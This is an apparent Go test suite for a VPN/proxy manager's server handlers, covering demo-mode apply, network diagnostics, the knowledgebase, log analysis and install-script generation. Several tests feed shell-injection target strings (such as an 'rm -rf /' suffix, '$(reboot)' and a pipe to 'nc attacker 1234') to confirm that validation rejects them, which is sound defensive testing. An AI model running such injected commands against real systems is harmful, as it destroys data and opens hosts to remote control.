package server

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"wayhop/internal/config"
	"wayhop/internal/core"
	"wayhop/internal/failsafe"
	"wayhop/internal/model"
	"wayhop/internal/plugin"
	"wayhop/internal/store"
)

// opshandlers_server builds a *Server with exactly the deps the ops handlers
// (apply / diagnostics / netdiag / kb / speedtest / server-check / server-script)
// touch. Everything is rooted in t.TempDir() so the suite stays offline and
// leaves nothing behind. Crucially the sing-box binary path points at a file that
// does NOT exist, so core.SingBox.Available() is false — handleApply then takes
// the demo/no-binary path (no config check, no reload, no spawn).
func opshandlers_server(t *testing.T) *Server {
	t.Helper()
	dir := t.TempDir()

	cfg := config.Default()
	// Point sing-box at a non-existent binary + a temp config target.
	cfg.SingBox.Bin = filepath.Join(dir, "no-such-sing-box")
	cfg.SingBox.Config = filepath.Join(dir, "out", "singbox.json")
	cfg.DataDir = dir // isolate: the default DataDir is a shared system path
	cfg.Demo = true

	st, err := store.Open(filepath.Join(dir, "profile.json"))
	if err != nil {
		t.Fatalf("store.Open: %v", err)
	}

	sb := core.New(cfg.SingBox.Bin, cfg.SingBox.Config)
	if sb.Available() {
		t.Fatalf("test setup broken: sing-box reports available at %q", cfg.SingBox.Bin)
	}

	return &Server{
		cfg:      cfg,
		store:    st,
		singbox:  sb,
		failsafe: failsafe.New(failsafe.DefaultDurations()),
		plugins:  plugin.New(filepath.Join(dir, "plugins"), dir),
	}
}

// opshandlers_post is a tiny helper to POST a JSON body to a handler and return
// the recorder.
func opshandlers_post(h func(http.ResponseWriter, *http.Request), path, body string) *httptest.ResponseRecorder {
	req := httptest.NewRequest(http.MethodPost, path, strings.NewReader(body))
	w := httptest.NewRecorder()
	h(w, req)
	return w
}

// opshandlers_awgEndpoint is an enabled AmneziaWG endpoint. It is realized by an
// external engine plugin, so it appears in the generator's plugin list and the
// apply response's "plugins" summary.
func opshandlers_awgEndpoint(id string) model.Endpoint {
	return model.Endpoint{
		ID: id, Name: "AWG", Engine: model.EngineAmneziaWG, Protocol: model.ProtoAmneziaWG,
		Server: "198.51.100.20", Port: 51820,
		Params: map[string]any{
			"private_key": "PRIV=", "peer_public_key": "PUB=",
			"local_address": []string{"10.13.13.2/32"},
			"jc":            4, "jmin": 40, "jmax": 70,
		},
		Enabled: true,
	}
}

// ---- handleApply (demo path) ----

// TestOpsHandlers_ApplyDemoAdvancesRecord drives handleApply in demo against a profile with one
// AmneziaWG endpoint. Demo touches nothing on the host: every plane is a demo no-op, but the record
// advances (a Test apply becomes the live revision) and the fail-safe arms with reboot disabled.
func TestOpsHandlers_ApplyDemoAdvancesRecord(t *testing.T) {
	s := opshandlers_server(t)
	t.Cleanup(func() { s.failsafe.Confirm() })
	if err := s.store.UpsertEndpoint(opshandlers_awgEndpoint("awg1")); err != nil {
		t.Fatalf("UpsertEndpoint: %v", err)
	}

	w := opshandlers_post(s.handleApply, "/api/apply", `{"save":false}`)
	if w.Code != http.StatusOK {
		t.Fatalf("handleApply: got %d, want 200 (%s)", w.Code, w.Body.String())
	}
	if cc := w.Header().Get("Cache-Control"); cc != "no-store" {
		t.Errorf("Cache-Control = %q, want no-store", cc)
	}

	var resp struct {
		Applied  bool             `json:"applied"`
		OK       bool             `json:"ok"`
		Saved    bool             `json:"saved"`
		Rev      string           `json:"rev"`
		Summary  applySummary     `json:"summary"`
		Problems []map[string]any `json:"problems"`
		Warnings []string         `json:"warnings"`
		FailSafe struct {
			Pending bool   `json:"pending"`
			Phase   string `json:"phase"`
		} `json:"failsafe"`
	}
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatalf("invalid JSON: %v (%s)", err, w.Body.String())
	}
	if !resp.Applied || !resp.OK || resp.Saved {
		t.Errorf("applied=%v ok=%v saved=%v, want true/true/false", resp.Applied, resp.OK, resp.Saved)
	}
	if resp.Summary.Core != "demo" || resp.Summary.Kernel != "demo" || resp.Summary.Plugins != "demo" {
		t.Errorf("summary = %+v, want demo planes", resp.Summary)
	}
	if resp.Problems == nil || resp.Warnings == nil {
		t.Errorf("problems/warnings must be arrays, got %s", w.Body.String())
	}
	if !resp.FailSafe.Pending || resp.FailSafe.Phase != "armed" {
		t.Errorf("a Test apply must arm the fail-safe: %+v", resp.FailSafe)
	}
	live := s.liveRevision()
	if live == nil || live.Rev != resp.Rev || !materializationIsDemo(&live.Materialization) {
		t.Fatalf("live revision = %+v, want the demo materialization at rev %s", live, resp.Rev)
	}
	// Demo never touches the host: no config file is written.
	if _, err := os.Stat(s.cfg.SingBox.Config); !os.IsNotExist(err) {
		t.Errorf("demo apply must not write %s", s.cfg.SingBox.Config)
	}
	// The plugin specs are recorded for the response even though nothing started.
	if len(live.Materialization.Plugins) != 1 || live.Materialization.Plugins[0].ID != "awg1" ||
		live.Materialization.Plugins[0].Endpoint.Engine != model.EngineAmneziaWG {
		t.Errorf("plugin specs = %+v", live.Materialization.Plugins)
	}
}

// TestOpsHandlers_ApplyEmptyProfileSaves verifies an empty (but valid) profile still applies and
// that save:true commits the record and leaves no window open.
func TestOpsHandlers_ApplyEmptyProfileSaves(t *testing.T) {
	s := opshandlers_server(t)

	w := opshandlers_post(s.handleApply, "/api/apply", `{"save":true}`)
	if w.Code != http.StatusOK {
		t.Fatalf("handleApply (empty profile): got %d, want 200 (%s)", w.Code, w.Body.String())
	}
	var resp struct {
		Applied  bool             `json:"applied"`
		Saved    bool             `json:"saved"`
		Problems []map[string]any `json:"problems"`
	}
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatalf("invalid JSON: %v (%s)", err, w.Body.String())
	}
	if !resp.Applied || !resp.Saved {
		t.Errorf("applied=%v saved=%v, want true/true", resp.Applied, resp.Saved)
	}
	if resp.Problems == nil || len(resp.Problems) != 0 {
		t.Errorf("problems = %v, want an empty list", resp.Problems)
	}
	if s.committedRevision() == nil || s.liveRevision() != nil {
		t.Error("save:true must commit the record and close any window")
	}
	if s.failsafe.Status().Pending {
		t.Error("save:true must not leave the fail-safe armed")
	}
}

// TestOpsHandlers_ApplyEmptyBodyOK confirms a completely empty request body is tolerated (it means
// {save:false}).
func TestOpsHandlers_ApplyEmptyBodyOK(t *testing.T) {
	s := opshandlers_server(t)
	t.Cleanup(func() { s.failsafe.Confirm() })
	req := httptest.NewRequest(http.MethodPost, "/api/apply", nil)
	w := httptest.NewRecorder()
	s.handleApply(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("handleApply (nil body): got %d, want 200 (%s)", w.Code, w.Body.String())
	}
	var resp struct {
		Applied bool `json:"applied"`
		Saved   bool `json:"saved"`
	}
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatalf("invalid JSON: %v (%s)", err, w.Body.String())
	}
	if !resp.Applied || resp.Saved {
		t.Errorf("applied=%v saved=%v, want applied=true saved=false", resp.Applied, resp.Saved)
	}
	// Malformed JSON is the one thing refused: 400 INVALID_REQUEST.
	w = opshandlers_post(s.handleApply, "/api/apply", `{"save":`)
	if w.Code != http.StatusBadRequest || !strings.Contains(w.Body.String(), applyCodeInvalidRequest) {
		t.Errorf("malformed body: got %d %s, want 400 INVALID_REQUEST", w.Code, w.Body.String())
	}
}

// ---- handleNetDiag (input validation) ----

// TestOpsHandlers_NetDiagRejectsInjection asserts the shell-injection guard:
// a target laced with metacharacters is rejected with 400 BEFORE any network
// call, so the test stays offline and deterministic. (ValidTarget allows only
// host/IP-shaped strings.)
func TestOpsHandlers_NetDiagRejectsInjection(t *testing.T) {
	s := opshandlers_server(t)

	bad := []string{
		`8.8.8.8; rm -rf /`,
		`example.com && curl evil`,
		`$(reboot)`,
		"host`whoami`",
		`a | nc attacker 1234`,
		`one two`, // space is not allowed
		``,        // empty
	}
	for _, target := range bad {
		body, _ := json.Marshal(map[string]string{"target": target})
		w := opshandlers_post(s.handleNetDiag, "/api/netdiag", string(body))
		if w.Code != http.StatusBadRequest {
			t.Errorf("netdiag target %q: got %d, want 400 (%s)", target, w.Code, w.Body.String())
		}
	}
}

// TestOpsHandlers_NetDiagMalformedBody400 covers the JSON-decode guard.
func TestOpsHandlers_NetDiagMalformedBody400(t *testing.T) {
	s := opshandlers_server(t)
	w := opshandlers_post(s.handleNetDiag, "/api/netdiag", `not json`)
	if w.Code != http.StatusBadRequest {
		t.Errorf("netdiag malformed body: got %d, want 400 (%s)", w.Code, w.Body.String())
	}
}

// TestOpsHandlers_NetDiagAcceptsValidTarget asserts a syntactically valid target
// passes the 400 guard (it does NOT short-circuit with bad request). The handler
// then runs real ping/traceroute/lookup, which on a sandbox may succeed or fail,
// so we only assert the response is NOT the validation 400 — i.e. the guard let
// it through. This keeps the test about the guard, not the network.
func TestOpsHandlers_NetDiagAcceptsValidTarget(t *testing.T) {
	s := opshandlers_server(t)
	// A loopback IP is a valid target shape and never leaves the box.
	w := opshandlers_post(s.handleNetDiag, "/api/netdiag", `{"target":"127.0.0.1"}`)
	if w.Code == http.StatusBadRequest {
		// Distinguish the validation 400 ("enter a valid host or IP address")
		// from any other outcome — the guard must NOT have rejected it.
		if strings.Contains(w.Body.String(), "valid host or IP") {
			t.Fatalf("valid target 127.0.0.1 was rejected by the guard: %s", w.Body.String())
		}
	}
	if w.Code != http.StatusOK && w.Code != http.StatusBadRequest {
		t.Fatalf("unexpected status %d for valid target (%s)", w.Code, w.Body.String())
	}
}

// ---- handleNetDiagStream (SSE) ----

// TestOpsHandlers_NetDiagStreamRejectsInjection asserts the streaming handler
// applies the same shell-injection guard as the JSON one, on the query param,
// BEFORE spawning ping/traceroute — so a metacharacter-laced target is a 400.
func TestOpsHandlers_NetDiagStreamRejectsInjection(t *testing.T) {
	s := opshandlers_server(t)
	for _, target := range []string{`8.8.8.8; rm -rf /`, `$(reboot)`, "host`whoami`", `-froot`, ``} {
		req := httptest.NewRequest(http.MethodGet, "/api/netdiag/stream?tool=ping&target="+url.QueryEscape(target), nil)
		w := httptest.NewRecorder()
		s.handleNetDiagStream(w, req)
		if w.Code != http.StatusBadRequest {
			t.Errorf("stream target %q: got %d, want 400 (%s)", target, w.Code, w.Body.String())
		}
	}
}

// TestOpsHandlers_NetDiagStreamDNS asserts the dns tool streams Server-Sent
// Events with the right content type: the loopback resolves to itself (offline,
// deterministic), framed as a "data:" line and terminated by "event: done".
func TestOpsHandlers_NetDiagStreamDNS(t *testing.T) {
	s := opshandlers_server(t)
	req := httptest.NewRequest(http.MethodGet, "/api/netdiag/stream?tool=dns&target=127.0.0.1", nil)
	w := httptest.NewRecorder()
	s.handleNetDiagStream(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("dns stream: got %d, want 200 (%s)", w.Code, w.Body.String())
	}
	if ct := w.Header().Get("Content-Type"); !strings.HasPrefix(ct, "text/event-stream") {
		t.Errorf("content-type = %q, want text/event-stream", ct)
	}
	body := w.Body.String()
	if !strings.Contains(body, "data: 127.0.0.1") {
		t.Errorf("dns stream missing the resolved-IP frame; body:\n%s", body)
	}
	if !strings.Contains(body, "event: done") {
		t.Errorf("dns stream missing the done marker; body:\n%s", body)
	}
}

// ---- handleKB ----

// TestOpsHandlers_KBReturnsEntries asserts the knowledgebase handler returns the
// full curated entry list as JSON, each with the fields the UI renders.
func TestOpsHandlers_KBReturnsEntries(t *testing.T) {
	s := opshandlers_server(t)
	req := httptest.NewRequest(http.MethodGet, "/api/kb", nil)
	w := httptest.NewRecorder()
	s.handleKB(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("handleKB: got %d, want 200 (%s)", w.Code, w.Body.String())
	}
	var entries []struct {
		ID          string   `json:"id"`
		Engine      string   `json:"engine"`
		Title       string   `json:"title"`
		Explanation string   `json:"explanation"`
		Fix         string   `json:"fix"`
		Sources     []string `json:"sources"`
	}
	if err := json.Unmarshal(w.Body.Bytes(), &entries); err != nil {
		t.Fatalf("invalid JSON: %v (%s)", err, w.Body.String())
	}
	if len(entries) == 0 {
		t.Fatal("knowledgebase is empty")
	}
	// Every entry must have an id, title and fix (the columns the UI shows), and
	// ids must be unique.
	seen := map[string]bool{}
	for _, e := range entries {
		if e.ID == "" || e.Title == "" || e.Fix == "" {
			t.Errorf("incomplete entry: %+v", e)
		}
		if seen[e.ID] {
			t.Errorf("duplicate kb id %q", e.ID)
		}
		seen[e.ID] = true
	}
	// Spot-check a well-known entry is present.
	if !seen["awg-junk-mismatch"] {
		t.Errorf("expected kb entry awg-junk-mismatch to be present; ids=%v", keysOf(seen))
	}
}

func keysOf(m map[string]bool) []string {
	out := make([]string, 0, len(m))
	for k := range m {
		out = append(out, k)
	}
	return out
}

// ---- handleDiagnostics + handleDiagnosticsAnalyze ----

// TestOpsHandlers_DiagnosticsLiveEmptyBuffer drives the live-log analyzer with no
// sing-box output captured: it returns an OK envelope with count 0 and no found
// entries.
func TestOpsHandlers_DiagnosticsLiveEmptyBuffer(t *testing.T) {
	s := opshandlers_server(t)
	req := httptest.NewRequest(http.MethodGet, "/api/diagnostics", nil)
	w := httptest.NewRecorder()
	s.handleDiagnostics(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("handleDiagnostics: got %d, want 200 (%s)", w.Code, w.Body.String())
	}
	var resp struct {
		Lines []map[string]any `json:"lines"`
		Found []map[string]any `json:"found"`
		Count int              `json:"count"`
	}
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatalf("invalid JSON: %v (%s)", err, w.Body.String())
	}
	if resp.Count != 0 {
		t.Errorf("count = %d, want 0 (no captured log)", resp.Count)
	}
	if len(resp.Found) != 0 {
		t.Errorf("found = %v, want none", resp.Found)
	}
}

// TestOpsHandlers_DiagnosticsAnalyzeMatchesKB pastes a log that contains two known
// error signatures (one AmneziaWG junk-mismatch, one WireGuard handshake-timeout)
// plus a blank line and a benign line. It asserts: blanks are dropped, the count
// equals the non-empty lines, the matching lines are flagged Error, and the
// de-duplicated "found" list contains both KB entries.
func TestOpsHandlers_DiagnosticsAnalyzeMatchesKB(t *testing.T) {
	s := opshandlers_server(t)
	logText := strings.Join([]string{
		"INFO router started cleanly",
		"",    // blank -> dropped
		"   ", // whitespace-only -> dropped
		"ERROR amneziawg: only 92 bytes received from peer",
		"WARN wireguard: handshake did not complete after 5 seconds",
		"handshake did not complete again", // duplicate signature -> deduped in found
	}, "\n")
	body, _ := json.Marshal(map[string]string{"text": logText})

	w := opshandlers_post(s.handleDiagnosticsAnalyze, "/api/diagnostics", string(body))
	if w.Code != http.StatusOK {
		t.Fatalf("handleDiagnosticsAnalyze: got %d, want 200 (%s)", w.Code, w.Body.String())
	}
	var resp struct {
		Lines []struct {
			Line    string `json:"line"`
			Error   bool   `json:"error"`
			Entries []struct {
				ID string `json:"id"`
			} `json:"entries"`
		} `json:"lines"`
		Found []struct {
			ID string `json:"id"`
		} `json:"found"`
		Count int `json:"count"`
	}
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatalf("invalid JSON: %v (%s)", err, w.Body.String())
	}

	// Blank/whitespace-only lines were dropped: 4 substantive lines remain.
	if resp.Count != 4 {
		t.Errorf("count = %d, want 4 (blanks dropped)", resp.Count)
	}
	if len(resp.Lines) != resp.Count {
		t.Errorf("lines length %d != count %d", len(resp.Lines), resp.Count)
	}

	// The de-duplicated found list must contain both KB entries exactly once.
	foundIDs := map[string]int{}
	for _, e := range resp.Found {
		foundIDs[e.ID]++
	}
	for _, want := range []string{"awg-junk-mismatch", "wg-handshake-timeout"} {
		if foundIDs[want] != 1 {
			t.Errorf("found[%q] = %d, want exactly 1; found=%v", want, foundIDs[want], foundIDs)
		}
	}

	// The AmneziaWG and WireGuard lines must each be flagged as an error line.
	matchedAWG, matchedWG := false, false
	for _, ln := range resp.Lines {
		for _, e := range ln.Entries {
			if e.ID == "awg-junk-mismatch" {
				matchedAWG = true
				if !ln.Error {
					t.Errorf("awg line not flagged Error: %q", ln.Line)
				}
			}
			if e.ID == "wg-handshake-timeout" {
				matchedWG = true
			}
		}
	}
	if !matchedAWG || !matchedWG {
		t.Errorf("expected both signatures matched on lines; awg=%v wg=%v", matchedAWG, matchedWG)
	}
}

// TestOpsHandlers_DiagnosticsAnalyzeMalformedBody400 covers the decode guard.
func TestOpsHandlers_DiagnosticsAnalyzeMalformedBody400(t *testing.T) {
	s := opshandlers_server(t)
	w := opshandlers_post(s.handleDiagnosticsAnalyze, "/api/diagnostics", `{`)
	if w.Code != http.StatusBadRequest {
		t.Errorf("malformed body: got %d, want 400 (%s)", w.Code, w.Body.String())
	}
}

// ---- handleServerScript ----

// TestOpsHandlers_ServerScriptNoProtocols400 asserts the empty-protocols guard.
func TestOpsHandlers_ServerScriptNoProtocols400(t *testing.T) {
	s := opshandlers_server(t)
	w := opshandlers_post(s.handleServerScript, "/api/server/script", `{"protocols":[],"host":"1.2.3.4"}`)
	if w.Code != http.StatusBadRequest {
		t.Fatalf("no protocols: got %d, want 400 (%s)", w.Code, w.Body.String())
	}
	if !strings.Contains(w.Body.String(), "at least one protocol") {
		t.Errorf("unexpected error message: %s", w.Body.String())
	}
}

// TestOpsHandlers_ServerScriptMalformedBody400 covers the decode guard.
func TestOpsHandlers_ServerScriptMalformedBody400(t *testing.T) {
	s := opshandlers_server(t)
	w := opshandlers_post(s.handleServerScript, "/api/server/script", `nonsense`)
	if w.Code != http.StatusBadRequest {
		t.Errorf("malformed body: got %d, want 400 (%s)", w.Code, w.Body.String())
	}
}

// TestOpsHandlers_ServerScriptReturnsScript asserts a valid request returns a
// non-empty install script that embeds the requested host and the per-protocol
// WR_PROTO markers (the build-script contract).
func TestOpsHandlers_ServerScriptReturnsScript(t *testing.T) {
	s := opshandlers_server(t)
	body := `{"protocols":["amneziawg","vless-reality"],"host":"203.0.113.9"}`
	w := opshandlers_post(s.handleServerScript, "/api/server/script", body)
	if w.Code != http.StatusOK {
		t.Fatalf("server script: got %d, want 200 (%s)", w.Code, w.Body.String())
	}
	var resp struct {
		Script string `json:"script"`
	}
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatalf("invalid JSON: %v (%s)", err, w.Body.String())
	}
	if strings.TrimSpace(resp.Script) == "" {
		t.Fatal("script is empty")
	}
	if !strings.Contains(resp.Script, "203.0.113.9") {
		t.Errorf("script does not embed the host:\n%s", resp.Script)
	}
	// Both protocol fragments contribute their WR_PROTO marker.
	for _, marker := range []string{"WR_PROTO=amneziawg", "WR_PROTO=vless-reality"} {
		if !strings.Contains(resp.Script, marker) {
			t.Errorf("script missing %q marker", marker)
		}
	}
}

// ---- handleServerCheck ----

// TestOpsHandlers_ServerCheckInvalidHost400 asserts the host-validation guard
// rejects an injection-shaped host with 400 before any dial/ping.
func TestOpsHandlers_ServerCheckInvalidHost400(t *testing.T) {
	s := opshandlers_server(t)
	for _, host := range []string{`8.8.8.8; rm -rf /`, `bad host`, `$(id)`, ``} {
		body, _ := json.Marshal(map[string]any{"host": host, "port": 22})
		w := opshandlers_post(s.handleServerCheck, "/api/server/check", string(body))
		if w.Code != http.StatusBadRequest {
			t.Errorf("server check host %q: got %d, want 400 (%s)", host, w.Code, w.Body.String())
		}
	}
}

// TestOpsHandlers_ServerCheckMalformedBody400 covers the decode guard.
func TestOpsHandlers_ServerCheckMalformedBody400(t *testing.T) {
	s := opshandlers_server(t)
	w := opshandlers_post(s.handleServerCheck, "/api/server/check", `}{`)
	if w.Code != http.StatusBadRequest {
		t.Errorf("malformed body: got %d, want 400 (%s)", w.Code, w.Body.String())
	}
}
